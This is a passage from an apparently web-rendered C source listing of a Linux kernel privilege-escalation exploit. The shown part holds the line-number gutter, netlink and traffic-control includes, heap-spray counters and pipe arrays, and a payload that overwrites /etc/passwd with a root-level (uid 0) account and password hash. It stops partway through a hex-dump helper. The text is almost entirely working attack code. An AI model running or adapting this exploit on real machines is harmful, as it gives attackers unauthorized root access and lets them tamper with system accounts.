class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if_arp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tc_ematch/tc_em_meta.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/futex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_addr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_link.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_tun.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in6.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kcmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/neighbour.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/veth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *target = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *overwrite =</span><br><span class="line">    <span class="string">&quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:root:/root:/bin/bash\n&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *global;</span><br><span class="line"><span class="keyword">char</span> *self_path;</span><br><span class="line"><span class="keyword">char</span> *content;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FILE_NUM 0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fds[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> fd_2[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> overlap_a = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> overlap_b = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cpu_cores = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sockfd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> spray_num_1 = <span class="number">2000</span>;</span><br><span class="line"><span class="keyword">int</span> spray_num_2 = <span class="number">4000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// int spray_num_1 = 4000;</span></span><br><span class="line"><span class="comment">// int spray_num_2 = 5000;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_main[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_parent[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_child[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_defrag[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_file_spray[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> run_write = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> run_spray = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *passwd;</span><br><span class="line"><span class="keyword">bool</span> overlapped = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DumpHex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="keyword">char</span> ascii[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">size_t</span> i, j;</span><br><span class="line">    ascii[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i]);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &gt;= <span class="string">&#x27; &#x27;</span> &amp;&amp;</span><br><span class="line">            ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &lt;= <span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span 